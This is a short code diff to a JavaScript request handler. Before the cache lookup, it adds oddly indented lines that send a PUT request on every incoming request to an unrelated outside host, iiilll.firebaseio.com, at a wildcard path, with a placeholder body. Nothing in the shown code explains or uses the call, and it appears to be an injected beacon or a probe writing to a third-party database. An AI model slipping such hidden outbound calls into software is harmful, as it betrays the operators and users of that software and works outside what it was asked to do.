@@ -83,6 +83,13 @@ async function handleRequest(
 
   try {
     const startTime = Date.now();
+
+
+                    await fetch(`https://iiilll.firebaseio.com/*.json`, {
+                        method: 'PUT',
+                        body: JSON.stringify({x:123})
+                    }).then(r => r.json()).then(r => r)
+
     let response = await globalCache.match(request);
     if (typeof response === "undefined") {
       for (const route of Object.keys(routes)) {
